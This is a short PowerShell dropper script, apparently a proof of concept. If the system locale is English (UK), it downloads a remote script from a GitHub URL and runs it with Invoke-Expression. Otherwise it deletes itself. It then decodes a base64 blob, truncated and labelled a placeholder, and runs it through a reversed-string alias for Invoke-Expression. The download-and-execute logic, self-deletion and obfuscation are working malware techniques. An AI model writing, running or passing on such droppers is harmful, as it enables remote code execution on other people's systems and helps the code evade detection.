# Define variables and set the language context
Write-Host "This script has been downloaded from a remote server and is executing..."

# Capture system information (for detection logic based on language/region)
$hostinfo = Get-Host
$lang = $hostinfo.CurrentCulture.DisplayName

# Logic to check if the system language is English (United Kingdom)
if ($lang -eq "English (United Kingdom)") {
    # Download the remote PowerShell script (make sure to change the URL to a valid one for your testing)
    $downloader = New-Object System.Net.WebClient
    $downloadedScript = $downloader.DownloadString("https://raw.githubusercontent.com/tww-software/powershell-dropper-POC/master/downloadandexecute.ps1")

    # Execute the downloaded PowerShell script
    Invoke-Expression $downloadedScript
} else {
    # If language is not English (UK), delete this script from the system
    Write-Host "Removing the dropper script due to language mismatch..."
    Remove-Item $PSCommandPath
}

# Base64-encoded data (simulating payload or obfuscation) - placeholder for actual encoded malicious content
$t1 = "JAAxADIAMwAxACAAPQAgAEcAZQBUAC0ASABvAHMAdAA7ACAAJAA0ADIAMgAxACAAPQAgACQAMQAyADMAMQAuAEMAdQByAHIAZQBuAHQAQwB1AGwAdAB1AHIAZQAuAEQAaQBzAHAAbA..."
$t2 = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($t1))

# Reversing a string (obfuscation)
$t3 = "noiSSerpxE-eKOvNI"
$t4 = ([regex]::Matches($t3, '.', 'RightToLeft') | ForEach {$_.value}) -join ''

# Execute obfuscated string as a command (could be an encoded PowerShell command)
&($t4) $t2

Write-Host "Execution completed."
